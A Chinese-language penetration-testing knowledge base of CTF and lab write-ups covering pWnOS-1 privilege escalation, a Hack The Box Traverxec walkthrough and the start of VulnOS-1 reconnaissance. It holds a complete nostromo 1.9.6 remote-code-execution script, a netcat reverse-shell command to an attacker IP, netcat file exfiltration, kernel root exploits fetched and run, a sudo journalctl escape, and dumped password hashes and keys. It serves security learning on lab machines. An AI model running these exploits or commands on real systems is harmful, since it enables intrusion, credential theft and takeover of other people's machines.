                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP                           
          .                  .                  dB' dBP    dB'.BP                                         
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP                               
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP                                
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                                 
                                                                                                          
                                                                    .                                     
                .                                                                                         
        o                  To boldly go where no                                                          
                            shell has gone before                                                         
                                                                                                          

       =[ metasploit v5.0.66-dev                          ]
+ -- --=[ 1956 exploits - 1089 auxiliary - 336 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use auxiliary/admin/webmin/file_disclosure
msf5 auxiliary(admin/webmin/file_disclosure) > set DIR /unauthenticated
DIR => /unauthenticated
msf5 auxiliary(admin/webmin/file_disclosure) > set RPATH /etc/shadow
RPATH => /etc/shadow
msf5 auxiliary(admin/webmin/file_disclosure) > set RPORT 10000
RPORT => 10000
msf5 auxiliary(admin/webmin/file_disclosure) > set RHOST 192.168.33.3
RHOST => 192.168.33.3
msf5 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.33.3

[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
daemon:*:14040:0:99999:7:::
bin:*:14040:0:99999:7:::
sys:*:14040:0:99999:7:::
sync:*:14040:0:99999:7:::
games:*:14040:0:99999:7:::
man:*:14040:0:99999:7:::
lp:*:14040:0:99999:7:::
mail:*:14040:0:99999:7:::
news:*:14040:0:99999:7:::
uucp:*:14040:0:99999:7:::
proxy:*:14040:0:99999:7:::
www-data:*:14040:0:99999:7:::
backup:*:14040:0:99999:7:::
list:*:14040:0:99999:7:::
irc:*:14040:0:99999:7:::
gnats:*:14040:0:99999:7:::
nobody:*:14040:0:99999:7:::
dhcp:!:14040:0:99999:7:::
syslog:!:14040:0:99999:7:::
klog:!:14040:0:99999:7:::
mysql:!:14040:0:99999:7:::
sshd:!:14040:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
[*] Auxiliary module execution completed
msf5 auxiliary(admin/webmin/file_disclosure) > set RPATH /home/obama/.ssh/authorized_keys
RPATH => /home/obama/.ssh/authorized_keys
msf5 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.33.3

[*] Attempting to retrieve /home/obama/.ssh/authorized_keys...
[*] The server returned: 200 Document follows
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm
[*] Auxiliary module execution completed
```

然后将hash用john解密即可

 - 提权3

``` bash
vmware@ubuntuvm:~$ uname -a
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
```
内核早已过期
谷歌搜索立即找到了有关vmsplice_to_pipe（）的好消息，这是一个本地特权升级漏洞，会影响2.6.24.2之前的内核。 来源可在ExploitDB上找到。 作者对源代码文件的名称充满了想象力（阅读第一行，很有趣）。[vmsplice Local Privilege Escalation](https://www.exploit-db.com/exploits/5092)

下载它然后编译

``` bash
root@kali:~# wget -O vmsplice.c https://www.exploit-db.com/download/5092 --no-check-certificate
--2019-12-31 11:12:44--  https://www.exploit-db.com/download/5092
正在解析主机 www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
正在连接 www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：6580 (6.4K) [application/txt]
正在保存至: “vmsplice.c”

vmsplice.c                 100%[======================================>]   6.43K  --.-KB/s  用时 0s      

2019-12-31 11:12:50 (40.8 MB/s) - 已保存 “vmsplice.c” [6580/6580])
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

``` bash
vmware@ubuntuvm:/tmp$ wget http://192.168.33.1:8000/vmsplice.c
--10:18:57--  http://192.168.33.1:8000/vmsplice.c
           => `vmsplice.c'
Connecting to 192.168.33.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6,580 (6.4K) [text/plain]

100%[==============================================================>] 6,580         --.--K/s             

10:18:57 (661.94 MB/s) - `vmsplice.c' saved [6580/6580]

vmware@ubuntuvm:/tmp$ gcc vmsplice.c -o exp
vmsplice.c:289:28: warning: no newline at end of file
vmware@ubuntuvm:/tmp$ ./exp
-----------------------------------
 Linux vmsplice Local Root Exploit
 By qaaz
-----------------------------------
[+] mmap: 0x0 .. 0x1000
[+] page: 0x0
[+] page: 0x20
[+] mmap: 0x4000 .. 0x5000
[+] page: 0x4000
[+] page: 0x4020
[+] mmap: 0x1000 .. 0x2000
[+] page: 0x1000
[+] mmap: 0xb7e5b000 .. 0xb7e8d000
[+] root
root@ubuntuvm:/tmp# id 
uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
root@ubuntuvm:/tmp# whoami
root
```

注意：C源码文件一定要放到目标机上编译才能运行，提权完成。。。

 - 提权4

这个靶机实在是太辣鸡了，简直就是个万人捅，，，sorry，太黄了。。。
还可以使用sock_sendpage()空指针来提权，具体参考[sock_sendpage() Local Privilege Escalation](https://www.exploit-db.com/download/9641)
按照里面的链接下载文件后，解压出来有好几个文件，全部放到目标机的tmp目录下，然后给777权限，直接运行run提权

``` bash
root@kali:~/linux-sendpage3# ls
exploit.c  exploit-pulseaudio.c  run  runcon-mmap_zero  sesearch-mmap_zero

vmware@ubuntuvm:/tmp$ ls
exp      exploit.c           exploit-pulseaudio.c  hello.cgi  runcon-mmap_zero    sqlMAUTWl
exploit  exploit-pulseaudio  exploit.so            run        sesearch-mmap_zero  vmsplice.c
vmware@ubuntuvm:/tmp$ ./run
# id
uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
# whoami
root
```

成功提权！！！帅呆了！！！

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end pWnOS-1 -->

</details>

<a id="case-traverxec"></a>

## Nostromo 映射与日志查看器

Nostromo 的请求执行连接用户文件，SSH 私钥口令恢复后继续分析 journalctl/less 的 sudo 交互能力。

<p class="kb-provenance">来源 Traverxec · 原记录 2020-04-21 · 22 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-traverxec">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Traverxec -->

#### 介绍

操作系统：Linux
难度：容易
点数：20
发行：2019年11月16日
IP：10.10.10.165

user一血用时：2小时26分钟49秒。
root一血用时：3小时06分钟28秒。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb24.jpg)



#### 信息收集

上nmap

``` bash
C:\Users\HASEE>nmap -p- -v -sV 10.10.10.165 --min-rate=1000 -T4
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  tcpwrapped
```

``` bash
C:\Users\HASEE>nmap -p 22,80 -v -A -T4 10.10.10.165
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|_  256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

扫描显示端口22和80是打开的。Nmap将HTTP-server-header报告为nostromo 1.9.6，这意味着该框正在运行nostromo HTTP服务。

Nostromo或nhttpd是一个开源web服务器。

网页似乎没有显示任何有趣的东西，Gobuster扫描也没有发现任何有用的东西。

#### 人工利用

经过一些研究，nostromo版本1.9.6有一个远程代码执行漏洞。

 - [nostromo-1.9.6-Remote-Code-Execution](https://www.exploit-db.com/exploits/47837)

现在下载python漏洞利用脚本并按如下方式执行它

先查看exploit的内容

``` bash
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py

#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    



"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)
    
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)
   
    except IndexError:
        print(help_menu)
```

然后利用脚本执行命令

``` bash
C:\Users\HASEE\Desktop\hack the box靶机渗透\Traverxec>python exploit.py 10.10.10.165 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Wed, 22 Apr 2020 02:12:04 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

为了得到一个反向shell，可以使用Netcat。运行脚本，并在本地机器上启动一个Netcat侦听器。

``` bash
root@kali:~/vulnhub/Traverxec# python exploit.py 10.10.10.165 80 "nc -c /bin/sh 10.10.15.136 5566"


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/ 
```

成功的收到了反弹回来的shell

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
10.10.10.165: inverse host lookup failed: Unknown host
connect to [10.10.15.136] from (UNKNOWN) [10.10.10.165] 47074
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@traverxec:/usr/bin$ whoami
whoami
www-data
```

#### 还可以使用metasploit

还可以使用Metasploit模块来利用这个漏洞。开始Metasploit并尝试利用它。

``` bash
msfconsole
msf > use exploit/multi/http/nostromo_code_exec
msf > set rhosts 10.10.10.165
msf > set lhost 10.10.15.136
msf > run
```

#### 横向移动

枚举系统来查找提权向量。/etc/passwd文件显示一个名为david的用户。

它还显示Nostromo web根目录是/var/nostromo/。

文件夹/var/nostromo/conf包含web服务器配置文件。

文件nhttpd.conf和.htpasswd看起来很有趣。

.htpasswd包含一个密码散列，这个散列是可破解的，但是它没有任何用处。
conf文件包含以下配置。

``` bash
www-data@traverxec:/var/nostromo/conf$ ls
ls
mimes  nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

HOMEDIRS部分确定用户的主目录中可能有一个public_www文件夹。

用户的主目录不可读，但是发现public_www是可访问的。

该文件夹包含protected-file-area子文件夹。

``` bash
www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www/protected-file-area
<conf$ cd /home/david/public_www/protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
```

文件夹的枚举显示一些备份的SSH密钥。用netcat把它们转移到本地box里。在本地运行以下命令以接收文件。

``` bash
root@kali:~/vulnhub/Traverxec# nc -lvp 1234 > backup.tgz
listening on [any] 1234 ...
```

接下来，在服务器上运行以下命令来完成传输。

``` bash
www-data@traverxec:/home/david/public_www/protected-file-area$ nc 10.10.15.136 1234 < backup-ssh-identity-files.tgz
<c 10.10.15.136 1234 < backup-ssh-identity-files.tgz
```

kali端成功收到了文件

``` bash
root@kali:~/vulnhub/Traverxec# ls -la
总用量 16
drwxr-xr-x  2 root root 4096 4月  21 22:58 .
drwxrwxrwx 21 root root 4096 4月  21 22:32 ..
-rw-r--r--  1 root root 1915 4月  21 23:01 backup.tgz
-rw-r--r--  1 root root 1503 4月  21 22:33 exploit.py
```

提取backup.tgz中的文件。

``` bash
root@kali:~/vulnhub/Traverxec# tar -xvf backup.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
root@kali:~/vulnhub/Traverxec# ls
backup.tgz  exploit.py  home
```

发现归档文件包含SSH密钥，其中可以使用私有密钥id_rsa作为david用户登录。

``` bash
root@kali:~/vulnhub/Traverxec/home/david/.ssh# ssh -i id_rsa david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

但是，私钥是加密的，需要密码。用john来试着破解它。首先，使用ssh2john从RSA密钥中提取散列。

``` bash
root@kali:~/vulnhub/Traverxec/home/david/.ssh# python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
/usr/share/john/ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
  data = base64.decodestring(data)
root@kali:~/vulnhub/Traverxec/home/david/.ssh# ls
authorized_keys  hash.txt  id_rsa  id_rsa.pub
root@kali:~/vulnhub/Traverxec/home/david/.ssh# cat hash.txt 
id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
```

接下来，使用john和rockyou.txt字典破解它。

``` bash
root@kali:~/vulnhub/Traverxec/home/david/.ssh# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:09 DONE (2020-04-21 23:13) 0.1097g/s 1574Kp/s 1574Kc/s 1574KC/sa6_123..*7¡Vamos!
Session completed
```

显示hunter为密码，使用它来SSH的连接到box。

``` bash
root@kali:~/vulnhub/Traverxec/home/david/.ssh# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Tue Apr 21 19:57:32 2020 from 10.10.15.14
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
david@traverxec:~$ whoami
david
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```

成功登录并找到了user.txt，然后提交

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb25.jpg)

#### 提权

用户的主目录包含一个名为bin的文件夹，其中包含以下内容。

``` bash
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

最后一行很有趣，因为它使用sudo执行journalctl。运行脚本来查看输出。

``` bash
david@traverxec:~/bin$ ./server-stats.sh 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

Load:  23:31:53 up 18:20,  1 user,  load average: 0.00, 0.00, 0.00
 
Open nhttpd sockets: 4
Files in the docroot: 117
 
Last 5 journal log lines:
-- Logs begin at Tue 2020-04-21 05:11:04 EDT, end at Tue 2020-04-21 23:31:53 EDT. --
Apr 21 18:32:26 traverxec crontab[10493]: (www-data) LIST (www-data)
Apr 21 18:32:26 traverxec sudo[10666]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=www-data
Apr 21 18:32:28 traverxec sudo[10666]: pam_unix(sudo:auth): conversation failed
Apr 21 18:32:28 traverxec sudo[10666]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Apr 21 18:32:28 traverxec sudo[10666]: www-data : command not allowed ; TTY=pts/7 ; PWD=/usr/bin ; USER=root ; COMMAND=list
```

该脚本使用journalctl返回nostromo服务日志的最后5行。

这是可以利用的，因为journalctl调用默认的分页器，而默认的分页器可能更少。

less命令将输出显示在用户的屏幕上，并在显示内容后等待用户输入。

可以通过运行shell命令来利用这一点。

``` bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

上面的命令调用less，之后可以通过前缀运行shell命令!。尝试执行/bin/bash。

``` bash
!/bin/bash
```

成功的提升到root权限并得到了root.txt

``` bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2020-04-22 00:21:56 EDT, end at Wed 2020-04-22 02:03:27 EDT. --
Apr 22 01:16:05 traverxec sudo[794]: www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/etc ; USER=root ; COMMAND=/bin/bash
Apr 22 01:58:13 traverxec su[856]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rh
Apr 22 01:58:15 traverxec su[856]: FAILED SU (to root) www-data on none
Apr 22 01:58:28 traverxec su[860]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rh
Apr 22 01:58:31 traverxec su[860]: FAILED SU (to root) www-data on none
!/bin/bash
root@traverxec:/home/david/bin# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david/bin# whoami
root
root@traverxec:/home/david/bin# cd /root
root@traverxec:~# ls
nostromo_1.9.6-1.deb  root.txt
root@traverxec:~# cat root.txt
9aa36a6d76f785dfd320a478f6e0d906
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb26.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb27.jpg)

<font color="red">知识点总结：</font>

 - nostromo版本1.9.6远程代码执行漏洞
 - nc -c /bin/sh 10.10.15.136 4444 命令反弹shell
 - Metasploit exploit/multi/http/nostromo_code_exec模块反弹shell
 - nc 10.10.15.136 1234 < backup-ssh-identity-files.tgz命令传输文件，并用nc -lvp 1234 > backup.tgz命令接收文件
 - ssh2john从RSA密钥中提取hash散列
 - john和rockyou.txt字典破解提取的hash值
 - /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service命令调用less之后通过前缀运行shell命令!，成功执行/bin/bash从而提权到root。

<font color="red">Game over</font>

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>



<!-- kb:end Traverxec -->

</details>

<a id="case-vulnos-1"></a>

## distcc 与多个管理入口

原环境提供 distcc、Webmin、Drupal 和 phpMyAdmin 多条可验证路线。保留模块执行、文件读取和凭据恢复各自的证据。

<p class="kb-provenance">来源 vulnos-1 · 原记录 2020-04-16 · 14 个代码块 · 12 处图片引用</p>

<details class="kb-evidence" id="record-vulnos-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start vulnos-1 -->

#### 名称
名称：VulnOS: 1
发布日期：2014年3月22日

#### 下载

VulnOS.vdi-vbox.7z

 - Download (Mirror): https://download.vulnhub.com/vulnos/VulnOS.vdi-vbox.7z
 - Download (Torrent): https://download.vulnhub.com/vulnos/VulnOS.vdi-vbox.7z.torrent



#### 描述

欢迎使用VulnOS！

这是制定的第一个脆弱目标，因为想回馈社区。为使事情成为可能的社区而努力！！！

目标是root它并找到操作系统内部的所有漏洞！这是一个ubuntu服务器10.04 LTS（已经制成了很多bug！！！）请勿在生产环境中使用此Box！这是一台VM，它是使用Virtualbox 4.3.8制作的-因此采用.vdi格式。

联网 ：
此box是使用桥接网络制成的，并使用DHCP获取IP地址（在构建时为192.168.1.66）。因此，最好将攻击操作系统和TARGET BOX共享到192.168.1.1/24的IP范围也许您可以使用m0n0wall进行设置并设置静态IP地址。
如果找不到目标的IP地址，请联系blakrat1 AT gmail DOT com。将为您提供root用户和密码以进行登录...。

希望你觉得这个box有用 ！！！

VulnHub独家！

#### 信息收集

上nmap

``` bash
C:\Users\HASEE>nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.124
Host is up (0.00s latency).
MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
```

``` bash
C:\Users\HASEE>nmap -p- -v -sV 192.168.56.124
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.7.0-P1
80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))
110/tcp   open  pop3        Dovecot pop3d
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  shell       Netkit rshd
901/tcp   open  http        Samba SWAT administration server
993/tcp   open  ssl/imap    Dovecot imapd
995/tcp   open  ssl/pop3    Dovecot pop3d
2000/tcp  open  sieve       Dovecot timsieved
2049/tcp  open  nfs         2-4 (RPC #100003)
3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1
3632/tcp  open  tcpwrapped
6667/tcp  open  irc         IRCnet ircd
8070/tcp  open  ucs-isc?
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
